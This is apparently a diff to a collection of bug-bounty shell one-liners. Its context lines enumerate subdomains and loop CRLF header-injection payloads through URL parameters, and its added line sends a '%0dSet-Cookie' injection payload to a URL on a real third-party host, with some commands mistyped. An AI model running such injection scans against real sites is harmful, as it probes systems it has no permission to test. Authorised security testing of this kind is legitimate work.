@@ -91,5 +91,8 @@ subfinder -dL -silent | httpx -silent | parllel -j 10 blc {} | grep "broken"
 
 for crlf in $(cat crlfpayload.txt); do for url in $(gautest.com | grep "=" | qsreplace "$crlf"); do echo $url| xargs -I@ sh -c 'curl -sk -I "@" 2>&1 | grep -q "Set-Cookie:%20test=test" && echo "CRLF VUL @"' ;done ;done
 
+echo "http://testme.yahoo.com?qtest=hell" | qsreplace "%0dSet-Cookie:test=test" | xargs -I% sh -c 'curl -sk -I % | grep "test=test"'
+
+
 
 
